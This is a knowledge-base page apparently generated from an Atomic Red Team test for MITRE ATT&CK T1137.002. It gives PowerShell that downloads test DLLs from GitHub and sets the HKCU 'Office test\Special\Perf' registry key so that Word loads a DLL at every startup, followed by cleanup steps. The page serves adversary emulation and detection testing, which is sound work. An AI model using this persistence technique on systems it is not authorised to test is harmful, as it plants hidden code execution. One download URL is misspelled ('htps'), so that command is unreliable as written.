---
atomic_guid: "c3e35b58-fe1c-480b-b540-7600fb612563"
title: "Office Application Startup Test Persistence (HKCU)"
framework: "atomic"
generated: "true"
attack_technique_id: "T1137.002"
attack_technique_name: "Office Application Startup: Office Test"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1137.002/T1137.002.yaml"
build_date: "2026-04-26 14:38:40"
executor: "powershell"
aliases:
  - "c3e35b58-fe1c-480b-b540-7600fb612563"
  - "Office Application Startup Test Persistence (HKCU)"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Office Application Startup Test Persistence (HKCU)

Office Test Registry location exists that allows a user to specify an arbitrary DLL that will be executed every time an Office
application is started. Key is used for debugging purposes. Not created by default & exist in HKCU & HKLM hives.

## Metadata

- Atomic GUID: c3e35b58-fe1c-480b-b540-7600fb612563
- Technique: T1137.002: Office Application Startup: Office Test
- Platforms: windows
- Executor: powershell
- Source Path: atomics/T1137.002/T1137.002.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1137-office_application_startup|T1137.002]]

## Dependencies

Microsoft Word must be installed

### Prerequisite Check

```text
try {
  New-Object -COMObject "Word.Application" | Out-Null
  Stop-Process -Name "winword"
  exit 0
} catch { exit 1 }
```

### Get Prerequisite

```text
Write-Host "You will need to install Microsoft Word manually to meet this requirement"
```

DLL files must exist on disk at specified location

### Prerequisite Check

```text
if ((Test-Path "PathToAtomicsFolder\T1137.002\bin\officetest_x64.dll") -and (Test-Path "PathToAtomicsFolder\T1137.002\bin\officetest_x86.dll")) {exit 0} else {exit 1}
```

### Get Prerequisite

```text
New-Item -Type Directory "PathToAtomicsFolder\T1137.002\bin\" -Force | Out-Null
Invoke-Webrequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.002/bin/officetest_x64.dll" -UseBasicParsing -OutFile "PathToAtomicsFolder\T1137.002\bin\officetest_x64.dll"
Invoke-Webrequest -Uri "htps://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.002/bin/officetest_x86.dll" -UseBasicParsing -OutFile "PathToAtomicsFolder\T1137.002\bin\officetest_x86.dll"
```

## Executor

- name: powershell

### Command

```powershell
$wdApp = New-Object -COMObject "Word.Application"
if(-not $wdApp.path.contains("Program Files (x86)"))  
{
  Write-Host "64-bit Office"
  reg add "HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf" /t REG_SZ /d "PathToAtomicsFolder\T1137.002\bin\officetest_x64.dll" /f       
}
else{
  Write-Host "32-bit Office"
  reg add "HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf" /t REG_SZ /d "PathToAtomicsFolder\T1137.002\bin\officetest_x86.dll" /f
}
Stop-Process -Name "WinWord" 
Start-Process "WinWord"
```

### Cleanup

```powershell
Stop-Process -Name "notepad","WinWord" -ErrorAction Ignore
Remove-Item "HKCU:\Software\Microsoft\Office test\Special\Perf" -ErrorAction Ignore
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1137.002/T1137.002.yaml)
